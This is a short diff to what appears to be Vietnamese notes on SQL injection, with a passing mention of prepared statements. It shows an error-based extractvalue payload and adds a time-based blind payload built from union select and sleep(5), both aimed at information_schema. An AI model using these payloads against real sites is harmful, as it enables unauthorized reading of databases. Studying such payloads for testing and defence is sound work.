@@ -29,6 +29,7 @@ Use preparestatement to execute query
 
 
 Sử dụng extractvalue: -1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata)))-- -
+Time base: '1)) union select 1,2,elt((select substr('abc',1,1) from information_schema.schemata limit 0,1)='a',sleep(5))-- -
 
 
 
